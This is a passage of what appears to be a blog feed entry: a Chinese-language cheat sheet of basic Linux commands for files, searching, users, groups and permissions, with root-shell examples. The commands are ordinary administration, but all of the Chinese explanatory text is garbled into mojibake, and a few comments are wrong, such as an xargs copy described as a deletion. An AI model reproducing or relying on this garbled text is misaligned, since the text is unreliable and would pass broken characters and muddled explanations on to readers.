    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="åŸºç¡€å‘½ä»¤"><a href="#åŸºç¡€å‘½ä»¤" class="headerlink" title="åŸºç¡€å‘½ä»¤"></a>åŸºç¡€å‘½ä»¤</h2><p>cd : åˆ‡æ¢ç›®å½•<br>cd :åˆ‡æ¢è·¯å¾„<br>cd ~ åˆ‡æ¢åˆ°å½“å‰ç”¨æˆ·çš„å®¶ç›®å½•<br>cd . åˆ‡æ¢åˆ°å½“å‰è·¯å¾„<br>cd .. åˆ‡æ¢åˆ°ä¸Šä¸€çº§è·¯å¾„<br>cd ..&#x2F;.. åˆ‡æ¢åˆ°ä¸Šä¸Šçº§è·¯å¾„(å…¶ä¸­ï¼šåœ¨linuxä¸­è·¯å¾„åˆ†éš”ç¬¦ä¸ºæ–œæ &#x2F;)<br>cd - åˆ‡æ¢åˆ°ä¸Šä¸€æ¬¡çš„è·¯å¾„</p><hr><p>ls : åˆ—å‡ºç›®å½•å†…å®¹<br>ls:åˆ—å‡ºç›®å½•å†…å®¹<br>ls -l:åˆ—å‡ºè¯¦ç»†ä¿¡æ¯<br>ls -a:åˆ—å‡ºå…¨éƒ¨æ–‡ä»¶ä¿¡æ¯ï¼ŒåŒ…æ‹¬éšè—æ–‡ä»¶<br>ls -d:åˆ—å‡ºç›®å½•è¯¦ç»†ä¿¡æ¯<br>ls -h:åˆ—å‡ºæ–‡ä»¶ä¿¡æ¯å¹¶æ˜¾ç¤ºæ–‡ä»¶å¤§å°å•ä½</p><hr><p>alias&#x2F;unalias  : å‘½ä»¤åˆ«å&#x2F;å–æ¶ˆå‘½ä»¤åˆ«å<br>alias åˆ«å&#x3D;â€™å‘½ä»¤â€™ :ç»™å‘½ä»¤èµ·åˆ«å<br>unalias åˆ«å :å–æ¶ˆå‘½ä»¤åˆ«å<br>unalias -a åˆ«å :å–æ¶ˆæ‰€æœ‰åˆ«å </p><hr><p>mv : ç§»åŠ¨ã€é‡å‘½åæ–‡ä»¶<br>mv æ—§æ–‡ä»¶å æ–°æ–‡ä»¶å &#x3D;&#x3D;&#x3D;&#x3D;&gt;ä¿®æ”¹æ–‡ä»¶å<br>å¦‚ï¼šmv file1 fileaå°†å½“å‰ç›®å½•çš„æ–‡ä»¶file1æ”¹åä¸ºfilea<br>mv æ—§ç›®å½•å æ–°ç›®å½•å &#x3D;&#x3D;&#x3D;&#x3D;&gt;ä¿®æ”¹ç›®å½•å<br>å¦‚ï¼šmv dir1 diraå°†å½“å‰ç›®å½•ä¸‹çš„ç›®å½•dir1æ”¹ä¸ºdira<br>â€‹mv æ–‡ä»¶å  ç›®å½•å  &#x3D;&#x3D;&#x3D;&#x3D;&gt;ç§»åŠ¨è·¯å¾„<br>å¦‚ï¼šmv filea diraå°†å½“å‰ç›®å½•ä¸‹fileaç§»åŠ¨åˆ°diraå­ç›®å½•<br>å¦‚ï¼šmv filea ~ å°†å½“å‰ç›®å½•ä¸‹fileaç§»åŠ¨å®¶ç›®å½•<br>å¦‚ï¼šmv ~&#x2F;filea ..å°†å®¶ç›®å½•ä¸‹çš„filaç§»åŠ¨åˆ°ä¸Šä¸€ä¸ªè·¯å¾„</p><hr><p>cp ï¼šå¤åˆ¶æ–‡ä»¶(ç›®å½•)<br>&#x3D;&#x3D;å¤åˆ¶ cp -r ç›®å½• -v è¯¦ç»† -f å¼ºåˆ¶ -n é™é»˜<br>â€‹<br>1ï¼‰ cp æºæ–‡ä»¶å ç›®æ ‡æ–‡ä»¶å<br>ä¸¾ä¾‹ï¼š<br> cp File1 file2å°†å½“å‰ç›®å½•ä¸‹çš„æ–‡ä»¶File1æ‹·è´æˆfile2</p><p>2ï¼‰ cp æºæ–‡ä»¶å ç›®æ ‡ç›®å½•å<br>ä¸¾ä¾‹ï¼š<br>cp file2 dira&#x2F;å°†å½“å‰ç›®å½•ä¸‹çš„æ–‡ä»¶file2æ‹·è´åˆ°diraå­ç›®å½•<br>â€‹<br>3ï¼‰ cp æºç›®å½•å ç›®æ ‡ç›®å½•å<br>ä¸¾ä¾‹ï¼š<br>cp -r dira dirbå¤åˆ¶diraç›®å½•ä¸‹çš„æ‰€æœ‰å†…å®¹åˆ°dirbã€‚å…¶ä¸­,-rå‚æ•°æ˜¯é€’å½’å¤åˆ¶<br>cp -i file2 diraå¦‚æœdiraç›®å½•ä¸‹é¢æœ‰åŒåçš„file2ï¼ŒåŠ å…¥-iå‚æ•°å°±ä¼šè¦æ±‚ä½ ç¡®è®¤æ˜¯å¦è¦†ç›–åŒåçš„æ–‡ä»¶</p><hr><p>mkdir : åˆ›å»ºç©ºç›®å½•<br>mkdir dir1<br>åˆ›å»ºä¸¤ä¸ªç›®å½•ï¼š<br>mkdir &#x2F;home&#x2F;dir2 &#x2F;home&#x2F;dir3<br>mkdir &#x2F;home&#x2F;{dir4,dir5}<br>mkdir -v &#x2F;home&#x2F;{dir6,dir7} #-v ï¼šverbose å†—é•¿çš„ã€‚æ˜¾ç¤ºåˆ›å»ºæ—¶çš„è¯¦ç»†ä¿¡æ¯<br>mkdir -p &#x2F;home&#x2F;dir8&#x2F;111&#x2F;222 #-p åˆ›å»ºè¿çº§ç›®å½•ï¼Œä¸€çº§ä¸€çº§çš„åˆ›å»º<br>rmdir : åˆ é™¤ç©ºç›®å½•<br>&#x3D;&#x3D;åˆ é™¤ rm -r é€’å½’åˆ é™¤ç›®å½• -f forceå¼ºåˆ¶ -v è¯¦ç»†è¿‡ç¨‹  *é€šé…ç¬¦</p><p>â€‹â€”</p><p>rm:åˆ é™¤ç›®å½•åŠå†…å®¹<br>rm -rf :åˆ é™¤æ‰€æœ‰<br>touch : åˆ›å»ºç©ºæ–‡ä»¶<br>[root@linux-server ~]# touch file1.txt &#x2F;&#x2F;æ— åˆ™åˆ›å»ºï¼Œå¦‚æœå­˜åœ¨ä¿®æ”¹æ—¶é—´<br>[root@linux-server ~]# touch &#x2F;home&#x2F;file10.txt<br>[root@linux-server ~]# touch &#x2F;home&#x2F;{zhuzhu,gougou} &#x2F;&#x2F;{}é›†åˆ<br>[root@linux-server ~]# touch &#x2F;home&#x2F;file{1..20} &#x2F;&#x2F;æ‰¹é‡åˆ›å»º</p><hr><p>echo : å†™å…¥<br>echo åŠ å†…å®¹ &gt; åŠ æ–‡ä»¶å #è¦†ç›–:æŠŠä¹‹å‰çš„å†…å®¹æ›¿æ¢æ‰<br>â€‹echo 123 &gt; a.txt<br>echo åŠ å†…å®¹ &gt;&gt; åŠ æ–‡ä»¶å  #è¿½åŠ :ä¿ç•™ä¹‹å‰çš„å†…å®¹,åœ¨åé¢æ·»åŠ æ–°å†…å®¹<br>â€‹echo 345345 &gt;&gt; a.txt<br>â€‹å½“ä½¿ç”¨echo 123 &gt;&gt; a.txt è¿™ä¸ªå‘½ä»¤çš„æ—¶å€™åœ¨æ–‡ä»¶ä¸å­˜åœ¨çš„æ—¶å€™ä¼šåˆ›å»ºè¯¥æ–‡ä»¶å¹¶å°†å†…å®¹è¿½åŠ åˆ°æ”¹æ–‡ä»¶ä¸­</p><hr><p>stat : è¯¦ç»†æŸ¥çœ‹æ–‡ä»¶è®¿é—®æ—¶é—´ç­‰ä¿¡æ¯<br>root@localhost ~] #stat fileæ–‡ä»¶: â€œfileâ€<br>å¤§å° : 24     å— ï¼š8    IOå— : 4096  æ™®é€šæ–‡ä»¶<br>è®¾å¤‡ : fdooh&#x2F;64768d   Inode : 35493573  ç¡¬é“¾æ¥âˆ¶1<br>æƒé™ : ( 0644&#x2F;- rw- râ€“râ€“ )  Uid : ( 0&#x2F; root)  Gid : (  0&#x2F;  rootï¼‰<br>ç¯å¢ƒ : unconfined_u: object_r: admin_home_t: so<br>æœ€è¿‘è®¿é—®:2023-04-05 11:31:37.678858345 +080O<br>æœ€è¿‘æ›´æ”¹:2023-04-05 11:31:35.590867350 +080O<br>æœ€è¿‘æ”¹åŠ¨:2023-04-05 11:31:53.385790608 +080O<br>åˆ›å»ºæ—¶é—´: -</p><hr><p>awkï¼šä»¥å…³é”®å­—åˆ†éš”æŸ¥çœ‹å†…å®¹<br>awk -F â€œ:â€ â€˜{print $2}â€™ æ–‡ä»¶è·¯å¾„<br>ä¾‹å¦‚:<br>[root@localhost ~]# cat &#x2F;home&#x2F;a<br>aaaa:skas:asdd<br>[root@localhost ~]# awk -F â€œ:â€ â€˜{print $2}â€™ &#x2F;home&#x2F;a<br>skas</p><hr><p>sort: æ’åº<br>[root@localhost ~]# sort -tâ€:â€ -k3 -n &#x2F;etc&#x2F;passwd #ä»¥: åˆ†éš”ï¼Œå°†ç¬¬ä¸‰åˆ—æŒ‰å­—æ•°å‡åº<br>[root@localhost ~]# sort -tâ€:â€ -k3 -n &#x2F;etc&#x2F;passwd -r #ä»¥: åˆ†éš”ï¼Œå°†ç¬¬ä¸‰åˆ—æŒ‰å­—æ•°é™åº<br>[root@localhost ~]# sort -tâ€:â€ -k3 -n &#x2F;etc&#x2F;passwd |head #ä»¥: åˆ†éš”ï¼Œå°†ç¬¬ä¸‰åˆ—æŒ‰å­—æ•°å‡åºçœ‹å‰åè¡Œ<br>[root@localhost ~]# sort -tâ€:â€ -k3 -n &#x2F;etc&#x2F;passwd |tail #ä»¥: åˆ†éš”ï¼Œå°†ç¬¬ä¸‰åˆ—æŒ‰å­—æ•°å‡åºçœ‹ååè¡Œ<br>å‚æ•°è¯¦è§£ï¼š<br>sort æ’åºï¼Œé»˜è®¤å‡åº<br>-t æŒ‡å®šåˆ†éš”ç¬¦<br>-k æŒ‡å®šåˆ—<br>-n æŒ‰æ•°å€¼<br>-r é™åº</p><hr><p>wc :ç»Ÿè®¡æ•°æ®<br>wc -l :ç»Ÿè®¡æœ‰å¤šå°‘è¡Œæ•°æ®</p><hr><p>find : é’ˆå¯¹æ–‡ä»¶å±æ€§æŸ¥æ‰¾æ–‡ä»¶<br>-name : æŒ‰æ–‡ä»¶åæŸ¥æ‰¾<br>[root@localhost ~]# find &#x2F;var&#x2F;cache&#x2F;yum&#x2F; -name â€œ<em>.rpmâ€ #æŸ¥æ‰¾&#x2F;var&#x2F;cache&#x2F;yumä¸‹ä»¥.rpmç»“å°¾çš„æ–‡ä»¶<br>[root@localhost ~]# find &#x2F;etc -iname â€œIfcfg-ens33â€     #-iå¿½ç•¥å¤§å°å†™<br>-size : æŒ‰æ–‡ä»¶å¤§å°æŸ¥æ‰¾<br>[root@localhost ~]# find &#x2F;etc -size +5M  #æŸ¥æ‰¾å¤§äº5M<br>[root@localhost ~]# find &#x2F;etc -size 5M  #ç­‰äº5M<br>[root@localhost ~]# find &#x2F;etc -size -5M  #å°äº5M<br>â€‹<br>[root@localhost ~]# find &#x2F; -size +3M -a -size -5M   #æŸ¥æ‰¾&#x2F;ä¸‹é¢å¤§äº3Mè€Œä¸”å°äº5Mçš„æ–‡ä»¶ â€”a:and<br>[root@localhost ~]# find &#x2F; -size -1M -o -size +8M   #æŸ¥æ‰¾&#x2F;ä¸‹é¢å°äº1Mæˆ–è€…å¤§äº8Mçš„æ–‡ä»¶ -o:or<br>[root@localhost ~]# find &#x2F; -size -3M -a -name â€œ</em>.txtâ€ #æŸ¥æ‰¾&#x2F;ä¸‹é¢å°äº3Mè€Œä¸”åå­—æ˜¯ä»¥.txtç»“å°¾çš„æ–‡ä»¶<br>-atime&#x2F;mtime&#x2F;ctime : æŒ‰æ—¶é—´æŸ¥æ‰¾<br>-atime &#x3D; accessè®¿é—®æ—¶é—´            #å•ä½æ˜¯ å¤©<br>-mtime &#x3D; modifyæ”¹å˜æ—¶é—´ å†…å®¹ä¿®æ”¹æ—¶é—´ä¼šæ”¹å˜<br>-ctime &#x3D; changeä¿®æ”¹æ—¶é—´ å±æ€§ä¿®æ”¹æ—¶é—´ä¼šæ”¹å˜<br>â€‹<br>-amin #åˆ†é’Ÿ<br>-mmin<br>-cmin<br>[root@localhost ~]# find &#x2F;opt -mtime +5  #ä¿®æ”¹æ—¶é—´5å¤©ä¹‹å‰<br>[root@localhost ~]# find &#x2F;opt -atime -1  #è®¿é—®æ—¶é—´1å¤©ä¹‹å†…<br>[root@localhost ~]# find . -amin +1    #è®¿é—®æ—¶é—´åœ¨1åˆ†é’Ÿä¹‹å‰<br>-type : æŒ‰æ–‡ä»¶ç±»å‹æŸ¥æ‰¾<br>-type f:æ™®é€šæ–‡ä»¶<br>-type l:é“¾æ¥æ–‡ä»¶<br>-type d:ç›®å½•æ–‡ä»¶<br>-type b:è®¾å¤‡æ–‡ä»¶<br>[root@localhost ~]# find &#x2F;dev -type f<br>-perm : æŒ‰æ–‡ä»¶æƒé™<br>[root@localhost ~]# find . -perm 644     #æŸ¥æ‰¾å½“å‰ç›®å½•ä¸‹æƒé™æ˜¯644çš„æ–‡ä»¶æˆ–ç›®å½•<br>[root@localhost ~]# find &#x2F;usr&#x2F;bin -perm -4000 #åŒ…å«set uid<br>-exec&#x2F;xargs : å‚æ•°ä¼ é€’<br>-exec:å‚æ•°æ˜¯ä¸€ä¸ªä¸€ä¸ªä¼ é€’çš„ï¼Œä¼ é€’ä¸€ä¸ªå‚æ•°æ‰§è¡Œä¸€æ¬¡å‘½ä»¤ã€‚<br>[root@localhost ~]# find &#x2F;etc -name â€œifcfg*â€ -exec cp -rf {} &#x2F;tmp ;   #execå‘½ä»¤æŸ¥æ‰¾å¸¦ifcfgå¼€å¤´çš„æ–‡ä»¶å¤åˆ¶åˆ°tmpä¸‹<br>[root@localhost ~]# find &#x2F;home&#x2F; -name test* -exec tar cvzf test.tar.gz {} ; #ç”±äº-execæ˜¯ä¸€æ¬¡ä¸€æ¬¡æ‰§è¡Œï¼Œæ‰€ä»¥ä¼šäº§ç”Ÿè¦†ç›–å¯¼è‡´æœ€ç»ˆåªä¼šäº§ç”Ÿä¸€ä¸ªtar.gzæ–‡ä»¶ï¼Œæ•…éœ€è¦å°† â€œ;â€ æ”¹æˆ â€œ+;â€<br>xargs:å°†å‰ä¸€ä¸ªå‘½ä»¤çš„æ ‡å‡†è¾“å‡ºä¼ é€’ç»™ä¸‹ä¸€ä¸ªå‘½ä»¤ï¼Œä½œä¸ºå®ƒçš„å‚æ•°è½¬æ¢æˆä¸‹ä¸€ä¸ªå‘½ä»¤çš„å‚æ•°åˆ—è¡¨ã€‚<br>[root@localhost ~]# find &#x2F;home&#x2F; -name â€œtest*â€ | xargs -i cp {} &#x2F;tmp&#x2F; #æ‰¾åˆ°ä¹‹ååˆ é™¤å¤„ç†xargs å‚æ•°ä¼ é€’<br>åŒºåˆ«ï¼š<br>1ã€execæ¯å¤„ç†ä¸€ä¸ªæ–‡ä»¶æˆ–è€…ç›®å½•ï¼Œå®ƒéƒ½éœ€è¦å¯åŠ¨ä¸€æ¬¡å‘½ä»¤ï¼Œæ•ˆç‡ä¸å¥½;<br>2ã€xargsä¸èƒ½æ“ä½œæ–‡ä»¶åæœ‰ç©ºæ ¼çš„æ–‡ä»¶ï¼›</p><hr><p>ping : æ£€æŸ¥ä¸»æœºæ˜¯å¦å¯ä»¥è”ç½‘<br>[root@linux-server ~]# ping <a class="link"   href="http://www.baidu.com/" >www.baidu.com <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> #pingå‘½ä»¤ï¼Œå¯ä»¥æ£€æŸ¥ä¸»æœºæ˜¯å¦å¯ä»¥è”ç½‘<br>PING <a class="link"   href="http://www.a.shifen.com/" >www.a.shifen.com <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> (183.232.231.174) 56(84) bytes of data.<br>â€‹<br>[root@linux-server ~]# ping -c 3 <a class="link"   href="http://www.baidu.com/" >www.baidu.com <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>-cï¼šæŒ‡å®šæ¬¡æ•°<br>ntp ï¼šå®ç°æœåŠ¡å™¨å¯¹æ—¶<br>[root@localhost ~]# yum install ntp<br>[root@localhost ~]# ntpdate ntp.aliyun.com<br>[root@localhost ~]# ntpdate cn.pool.ntp.org #cn.pool.ntp.orgæ˜¯ntpç½‘ç»œæˆæ—¶ç»„ç»‡çš„ä¸­å›½æˆæ—¶æº</p><hr><p>which ï¼šæŸ¥æ‰¾å‘½ä»¤<br>[root@localhost ~]# which cd<br>&#x2F;usr&#x2F;bin&#x2F;cd</p><hr><p>æŸ¥çœ‹æ–‡ä»¶å†…å®¹<br>catï¼šæŸ¥çœ‹ä¸€ä¸ªæ–‡ä»¶çš„å…¨éƒ¨å†…å®¹<br>cat -n : æ˜¾ç¤ºè¡Œå·<br>cat -A : æ˜¾ç¤ºæ§åˆ¶å­—ç¬¦</p><hr><p>head ï¼šå¤´éƒ¨<br>[root@linux-server ~]# head &#x2F;etc&#x2F;passwd &#x2F;&#x2F;é»˜è®¤æŸ¥çœ‹å‰åè¡Œ<br>[root@linux-server ~]# head -2 &#x2F;etc&#x2F;passwd &#x2F;&#x2F;æŸ¥çœ‹å‰ä¸¤è¡Œ<br>tail ï¼šå°¾éƒ¨<br>[root@linux-server ~]# tail &#x2F;etc&#x2F;passwd &#x2F;&#x2F;é»˜è®¤æŸ¥çœ‹æ–‡ä»¶çš„ååè¡Œ<br>[root@linux-server ~]# tail -1 &#x2F;etc&#x2F;passwd &#x2F;&#x2F;æŸ¥çœ‹æ–‡ä»¶æœ€åä¸€è¡Œ<br>[root@linux-server ~]# tail &#x2F;var&#x2F;log&#x2F;messages<br>[root@linux-server ~]# tail -f &#x2F;var&#x2F;log&#x2F;secure &#x2F;&#x2F;-f åŠ¨æ€æŸ¥çœ‹æ–‡ä»¶çš„å°¾éƒ¨<br>[root@linux-server ~]# tailf &#x2F;var&#x2F;log&#x2F;secure &#x2F;&#x2F;åŠŸèƒ½åŒä¸Š</p><hr><p>grepï¼šè¿‡æ»¤å…³é”®å­—<br>è¿‡æ»¤æ–‡ä»¶ä¸­å¸¦æœ‰rootçš„å†…å®¹ï¼š<br>[root@linux-server ~]# grep â€˜rootâ€™ &#x2F;etc&#x2F;passwd<br>è¿‡æ»¤ä»¥rootå¼€å¤´çš„è¡Œï¼š^ â€“ä»¥ä»€ä¹ˆå¼€å¤´<br>[root@linux-server ~]# grep â€˜^rootâ€™ &#x2F;etc&#x2F;passwd<br>è¿‡æ»¤ä»¥bashç»“å°¾çš„è¡Œï¼š$ â€“ä»¥ä»€ä¹ˆç»“å°¾<br>[root@linux-server ~]# grep â€˜bash$â€™ &#x2F;etc&#x2F;passwd</p><hr><p>less ï¼šåˆ†é¡µæ˜¾ç¤º<br>[root@linux-server ~]# less &#x2F;etc&#x2F;makedumpfile.conf.sample<br>1.ç©ºæ ¼é”®æ˜¯ç¿»é¡µ å›è½¦é”®æ˜¯ç¿»è¡Œ<br>2.ä¸Šä¸‹ç®­å¤´å¯ä»¥æ¥å›ç¿»<br>3.&#x2F;å…³é”®å­—  #æœç´¢ (næŒ‰å…³é”®å­—å¾€ä¸‹ç¿» NæŒ‰å…³é”®å­—å¾€ä¸Šç¿»)<br>4.å¿«æ·é”®:q -quit é€€å‡º<br>more ï¼šåˆ†é¡µæ˜¾ç¤ºæ–‡ä»¶å†…å®¹<br>[root@localhost ~]# more æ–‡ä»¶å<br>ç©ºæ ¼é”®æ˜¯ç¿»é¡µ å›è½¦é”®æ˜¯ç¿»è¡Œ</p><h2 id="ç”¨æˆ·ç®¡ç†"><a href="#ç”¨æˆ·ç®¡ç†" class="headerlink" title="ç”¨æˆ·ç®¡ç†"></a>ç”¨æˆ·ç®¡ç†</h2><p>useradd &#x2F; userdel &#x2F; usermod  ï¼š ç”¨æˆ·ç®¡ç†<br>-M : ä¸åˆ›å»ºç”¨æˆ·ä¸»ç›®å½•<br>-r : åˆ›å»ºç³»ç»Ÿç”¨æˆ·<br>â€‹<br>[root@linux-server ~]# useradd user02 -u 503 &#x2F;&#x2F;æŒ‡å®šuidä¸º503<br>[root@linux-server ~]# useradd user05 -s &#x2F;sbin&#x2F;nologin &#x2F;&#x2F;åˆ›å»ºç”¨æˆ·å¹¶æŒ‡å®šshell<br>[root@linux-server ~]# useradd user07 -G it,fd &#x2F;&#x2F;åˆ›å»ºç”¨æˆ·ï¼ŒæŒ‡å®šé™„åŠ ç»„<br>[root@linux-server ~]# useradd -g 1003 user8 #æŒ‡å®šç”¨æˆ·çš„ä¸»å±ç»„ä¸º1003ç»„ã€‚<br>[root@linux-server ~]# useradd user10 -u 4000 -s &#x2F;sbin&#x2F;nologin<br>userdel -r ï¼šå®Œå…¨åˆ é™¤ç”¨æˆ·</p><p>1.ä¿®æ”¹ç”¨æˆ·åï¼š<br>-l<br>[root@linux-server ~]# usermod -l NEW_name user8<br>[root@linux-server ~]# id user8<br>id: user8ï¼šæ— æ­¤ç”¨æˆ·</p><p>2.ä¿®æ”¹GIDï¼š<br>-g<br>[root@linux-server ~]# id user10<br>uid&#x3D;1000(user10) gid&#x3D;1000(tom) groups&#x3D;1000(tom)<br>[root@linux-server ~]# usermod user10 -g new_gid #gidéœ€è¦æå‰å­˜åœ¨</p><p>3.ä¿®æ”¹UID<br>-u<br>[root@linux-server ~]# usermod -u new_id jack<br>[root@linux-server ~]# id jack<br>uid&#x3D;1005(jack) gid&#x3D;1004(jack) groups&#x3D;1004(jack)</p><p>4.ä¿®æ”¹ç”¨æˆ·çš„ç™»å½•shell<br>-s<br>[root@linux-server ~]# usermod -s &#x2F;sbin&#x2F;nologin user07 #ä¿®æ”¹ç”¨æˆ·çš„ç™»å½•shell<br>groupadd &#x2F; groupmod &#x2F; groupdelï¼šç»„ç®¡ç†<br>[root@linux-server ~]# groupadd hr &#x2F;&#x2F;åˆ›å»ºä¸€ä¸ªç”¨æˆ·ç»„å«hr<br>[root@linux-server ~]# groupadd net01 -g 2000 &#x2F;&#x2F;åˆ›å»ºç»„å«net01ï¼Œå¹¶æŒ‡å®šgidä¸º2000<br>[root@linux-server ~]# grep â€˜net01â€™ &#x2F;etc&#x2F;group &#x2F;&#x2F;æŸ¥çœ‹&#x2F;etc&#x2F;groupä¸­ç»„net01ä¿¡æ¯<br>net01:x:2000:<br>[root@linux-server ~]#groupmod å‚æ•° ç»„å<br>-gï¼šä¿®æ”¹ç»„çš„gid<br>-nï¼šä¿®æ”¹ç»„å<br>[root@linux-server ~]#groupmod -g 2000 grp1<br>[root@linux-server ~]#groupmod -n æ–°ç»„å grp1<br>[root@linux-server ~]# groupdel net01 #åˆ é™¤ç»„net01<br>æ³¨æ„ï¼šç”¨æˆ·çš„ä¸»å±ç»„ä¸èƒ½åˆ é™¤<br>gpasswd : ç»„æˆå‘˜ç®¡ç†<br>æ³¨æ„ï¼šåªé’ˆå¯¹å·²å­˜åœ¨çš„ç”¨æˆ·</p><hr><p>1.ç»™ç»„æ·»åŠ è´¦æˆ·<br>-a<br>[root@linux-server ~]# gpasswd -a user10 grp2<br>Adding user user10 to group grp2<br>2.åŒæ—¶æ·»åŠ å¤šä¸ªç”¨æˆ·åˆ°ç»„<br>-M:membersæˆå‘˜çš„ç¼©å†™<br>[root@linux-server ~]# gpasswd -M tom,alice it ï¼ˆ<strong>ä¼šè¦†ç›–è¯¥ç»„ä¹‹å‰çš„ç»„æˆå‘˜</strong>ï¼‰<br>3.ä»ç»„åˆ é™¤ç”¨æˆ·<br>-d<br>[root@linux-server ~]# gpasswd -d user07 hr</p><h2 id="æƒé™ç®¡ç†"><a href="#æƒé™ç®¡ç†" class="headerlink" title="æƒé™ç®¡ç†"></a>æƒé™ç®¡ç†</h2><p>chown:æ”¹å˜æ–‡ä»¶æˆ–ç›®å½•çš„æ‰€å±ä¸»ä»¥åŠæ‰€å±ç»„<br>chown :ï¼ˆchown å±ä¸».å±ç»„ æ–‡ä»¶åï¼‰<br>â€‹<br>[root@linux-server ~]# chown alice.hr file1.txt &#x2F;&#x2F;ä¿®æ”¹å±ä¸»ã€å±ç»„<br>[root@linux-server ~]# chown tom file1.txt &#x2F;&#x2F;ä¿®æ”¹å±ä¸»<br>[root@linux-server ~]# chown .it file1.txt &#x2F;&#x2F;åªæ”¹å±ç»„<br>â€‹<br>[root@linux-server ~]# chown -R alice.hr dir1 &#x2F;&#x2F;é€’å½’ä¿®æ”¹â€”é’ˆå¯¹ç›®å½•<br>chmod : æ›´æ”¹æƒé™<br>åŸºæœ¬æƒé™ç±»å‹ï¼š<br>è¯» ï¼šr â€”-&gt; 4<br>å†™ ï¼šw â€”-&gt; 2<br>æ‰§è¡Œ: x(exec) â€”â€“&gt; 1<br>â€‹<br>[root@linux-server ~]# chmod -R a&#x3D;rwx dir1 &#x2F;&#x2F;é€’å½’æ›´æ”¹ç›®å½•åŠå…¶ä¸­æ–‡ä»¶çš„æƒé™</p><p>a. ä½¿ç”¨ç¬¦å·*<br>â€‹[root@linux-server ~]# chmod u+x file1.txt  &#x2F;&#x2F;å±ä¸»å¢åŠ æ‰§è¡Œ<br>[root@linux-server ~]# chmod a&#x3D;rwx file1.txt &#x2F;&#x2F;æ‰€æœ‰äººç­‰äºè¯»å†™æ‰§è¡Œ<br>[root@linux-server ~]# chmod a&#x3D;- file1.txt &#x2F;&#x2F;æ‰€æœ‰äººéƒ½æ²¡æœ‰æƒé™<br>[root@linux-server ~]# chmod ug&#x3D;rw,o&#x3D;r file1.txt &#x2F;&#x2F;å±ä¸»å±ç»„ç­‰äºè¯»å†™ï¼Œå…¶ä»–äººåªè¯»<br>[root@linux-server ~]# ll<br>-rw-rw-râ€“. 1 tom it  0 Nov 1 15:30 file1.txt</p><p>b.ä½¿ç”¨æ•°å­—*<br>â€‹[root@linux-server ~]# chmod 644 file1.txt<br>[root@linux-server ~]# ll file1.txt<br>-rw-râ€“râ€“. 1 tom it 0 Nov 1 15:30 file1.txt<br>â€‹<br>[root@linux-server ~]# chmod 755 file1.txt<br>[root@linux-server ~]# ll<br>-rwxr-xr-x 1 root root 0 Jul 23 22:40 file1.txt<br>â€‹<br>[root@linux-server ~]# chmod 521 file1.txt<br>[root@linux-server ~]# ll<br>-r-x-wâ€”x 1 root root 0 Jul 23 22:40 file1.txt</p><hr><p>chgrp : æ›´æ”¹å±ç»„<br>[root@linux-server ~]# chgrp hr file1.txt &#x2F;&#x2F;æ›´æ”¹æ–‡ä»¶file1.txtæ‰€å±ç»„ä¸ºhr<br>â€‹<br>[root@linux-server ~]# chgrp -R hr dir1 &#x2F;&#x2F;é€’å½’æ›´æ”¹ç›®å½•dir1åŠå…¶ä¸­æ–‡ä»¶æ‰€å±ç»„ä¸ºhr </p><hr><p>ACLæƒé™<br>getfacl ï¼šæŸ¥çœ‹æ–‡ä»¶æˆ–ç›®å½•å½“å‰è®¾å®šçš„ ACL æƒé™ä¿¡æ¯<br>[root@localhost ~]# getfacl æ–‡ä»¶å<br>setfacl ï¼šç›´æ¥è®¾å®šç”¨æˆ·æˆ–ç¾¤ç»„å¯¹æŒ‡å®šæ–‡ä»¶çš„è®¿é—®æƒé™<br>setfacl -mï¼šç»™ç”¨æˆ·æˆ–ç¾¤ç»„æ·»åŠ  ACL æƒé™<br>chattrï¼šæ–‡ä»¶éšè—å±æ€§</p><hr><p>[root@linux-server ~]# touch file1 file2 file3<br>1.æŸ¥çœ‹æ–‡ä»¶å±æ€§<br>[root@linux-server ~]# lsattr file1 file2 file3  #æŸ¥çœ‹æ–‡ä»¶éšè—å±æ€§<br>â€”â€”â€”â€”â€”- file1<br>â€”â€”â€”â€”â€”- file2<br>â€”â€”â€”â€”â€”- file3<br>2.è®¾ç½®æƒé™<br>[root@linux-server ~]# chattr +a file1 #ä¸å…è®¸ä¿®æ”¹ï¼Œåªå…è®¸è¿½åŠ <br>[root@linux-server ~]# chattr +i file2 #ä¸å…è®¸åšä»»ä½•æ“ä½œ<br>[root@linux-server ~]# chattr +A file3<br>[root@linux-server ~]# lsattr file1 file2 file3<br>â€”â€“aâ€”â€”â€”- file1<br>â€”-iâ€”â€”â€”â€“ file2<br>â€”â€”-Aâ€”â€”â€“ file3<br>â€‹<br>i:å³Immutableï¼Œç³»ç»Ÿä¸å…è®¸å¯¹è¿™ä¸ªæ–‡ä»¶è¿›è¡Œä»»ä½•çš„ä¿®æ”¹<br>aï¼šå³Append Onlyï¼Œç³»ç»Ÿåªå…è®¸åœ¨è¿™ä¸ªæ–‡ä»¶ä¹‹åè¿½åŠ æ•°æ®ï¼Œä¸å…è®¸ä»»ä½•è¦†ç›–æˆ–æˆªæ–­è¿™ä¸ªæ–‡ä»¶<br>Aï¼šå³Atimeï¼Œå‘Šè¯‰ç³»ç»Ÿä¸è¦ä¿®æ”¹å¯¹è¿™ä¸ªæ–‡ä»¶çš„æœ€åè®¿é—®æ—¶é—´<br>â€‹<br>å–æ¶ˆæƒé™<br>[root@linux-server ~]# chattr -a file1<br>[root@linux-server ~]# chattr -i file2<br>ç®¡é“ä¸é‡å®šå‘<br>awkï¼šè¿‡æ»¤å¹¶è¾“å‡ºæ–‡ä»¶ä¸­ç¬¦åˆæ¡ä»¶çš„å†…å®¹<br>awk -F â€œåˆ†éš”ç¬¦â€ â€˜{print $ç¬¬å‡ åˆ—}â€™<br>[root@localhost ~]# cat &#x2F;home&#x2F;aaa<br>sdjlasjlk<br>asldjasjlkdasjl<br>[root@localhost ~]# grep â€˜sdâ€™ &#x2F;home&#x2F;aaa | awk -F â€œjâ€ â€˜{print $2}â€™ #è¿‡æ»¤aaaä¸­çš„ä¸€è¡Œå†…å®¹ç„¶åå°†ç»“æœé€šè¿‡ç®¡é“ä¼ é€’ç»™                  awkï¼Œè¿‡æ»¤å¹¶è¾“å‡ºä»¥jä¸ºåˆ†éš”ç¬¦çš„ç¬¬äºŒåˆ—å†…å®¹<br>las<br>sort: æ’åº<br>[<a class="link"   